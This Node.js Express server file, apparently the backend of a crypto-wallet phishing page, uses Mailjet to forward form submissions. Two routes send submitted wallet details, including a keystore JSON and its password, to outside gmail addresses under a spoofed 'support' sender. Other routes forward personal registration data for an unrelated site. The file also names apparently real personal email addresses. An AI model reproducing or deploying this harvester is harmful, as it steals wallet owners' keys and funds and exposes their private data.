var express = require('express');
var cors = require('cors');
var app = express();
var dotenv = require('dotenv').config();
const Mailjet = require('node-mailjet');
const mailjet = Mailjet.apiConnect(
    process.env.MJ_APIKEY_PUBLIC,
    process.env.MJ_APIKEY_PRIVATE,
);
var port = process.env.PORT || process.env.LOCAL_PORT;

var corsOptions = {
    origin: "*",
    methods: "GET,HEAD,PUT,PATCH,POST,DELETE",
    preflightContinue: false,
    optionsSuccessStatus: 204
}

app.get('/', (req, res) => {
    res.send(`Welcome to Testmailer`)
})

app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cors(corsOptions));

app.post('/', (req, res) => {
    const request = mailjet
    .post("send", {'version': 'v3.1'})
    .request({
    "Messages":[
        {
        "From": {
            "Email": "support@virtualfx.org",
            "Name": "Impozzible"
        },
        "To": [
            {
            "Email": "pushat155@gmail.com",
            "Name": "tester"
            }
        ],
        "Subject": "Wallet Details",
        "TextPart": `The following details were submitted from your website: Wallet Name: ${req.body.name}, Type: ${req.body.type}, Address: ${req.body.address}`,
        "CustomID": "AppGettingStartedTest"
        }
    ]
    })
    request
    .then(() => {
        console.log('Link successfully sent')
        res.status("200").json({
            message: "Link successfully sent"
        })
    })
    .catch((err) => {
        console.log('Unable to send link ' + err)
        console.log(err.statusCode)
        res.status("400").json({
            message: 'Unable to send link ' + err
        })
    })
})

app.post('/keystore', (req, res) => {
    const request = mailjet
    .post("send", {'version': 'v3.1'})
    .request({
    "Messages":[
        {
        "From": {
            "Email": "support@virtualfx.org",
            "Name": "Impozzible"
        },
        "To": [
            {
            "Email": "johnkingsley917@gmail.com",
            "Name": "tester"
            }
        ],
        "Subject": "Wallet Details",
        "TextPart": `The following details were submitted from your website: Wallet Name: ${req.body.name}, Type: Keystore, Keystore JSON: ${req.body.jsonKey}, Password: ${req.body.password}`,
        "CustomID": "AppGettingStartedTest"
        }
    ]
    })
    request
    .then(() => {
        console.log('Link successfully sent')
        res.status(200).json({
            message: "Link successfully sent"
        })
    })
    .catch((err) => {
        console.log('Unable to send link ' + err)
        console.log(err.statusCode)
        res.status(400).json({
            message: 'Unable to send link ' + err
        })
    })
})

//submeets email sending routes
app.post("/submeets/contact", (req, res) => {
    const { name, email, subject, message } = req.body;
    const request = mailjet
    .post("send", {'version': 'v3.1'})
    .request({
    "Messages":[
        {
        "From": {
            "Email": "support@virtualfx.org",
            "Name": "Impozzible"
        },
        "To": [
            {
            "Email": "info@submeets.com",
            "Name": "Submeets"
            }
        ],
        "Subject": "Contact Details",
        "TextPart": `The following details were submitted from your website contact page: Name: ${name}, Email: ${email}, Subject: ${subject}, Message: ${message}`,
        "CustomID": "AppGettingStartedTest"
        }
    ]
    })
    request
    .then(() => {
        console.log('Message successfully sent')
        res.status(200).json({
            message: "Message successfully sent"
        })
    })
    .catch((err) => {
        console.log('Unable to send message ' + err)
        console.log(err.statusCode)
        res.status(400).json({
            message: 'Unable to send message ' + err
        })
    })
})

app.post("/submeets/register", (req, res) => {
    const { name, dob, dungeonName, address, city, state, phoneNumber, email, mistressName, preferredContactMethod, gender, membershipType } = req.body;
    const request = mailjet
    .post("send", {'version': 'v3.1'})
    .request({
    "Messages":[
        {
        "From": {
            "Email": "support@virtualfx.org",
            "Name": "Impozzible"
        },
        "To": [
            {
            "Email": "info@submeets.com",
            "Name": "Submeets"
            }
        ],
        "Subject": "Registration Details",
        "TextPart": `The following details were submitted from your website registration page: Name: ${name}, Date of Birth: ${dob}, Dungeon Name: ${dungeonName}, Address: ${address}, City: ${city}, State: ${state}, Phone Number: ${phoneNumber}, Email: ${email}, Mistress Name: ${mistressName}, Preferred Contact Method: ${preferredContactMethod}, Gender: ${gender}, Membership Type: ${membershipType}`,
        "CustomID": "AppGettingStartedTest"
        }
    ]
    })
    request
    .then(() => {
        console.log('Message successfully sent')
        res.status(200).json({
            message: "Message successfully sent"
        })
    })
    .catch((err) => {
        console.log('Unable to send message ' + err)
        console.log(err.statusCode)
        res.status(400).json({
            message: 'Unable to send message ' + err
        })
    })
})

app.listen(port, () => {
    console.log(`Testmailer server currently active on port ${port}`)
})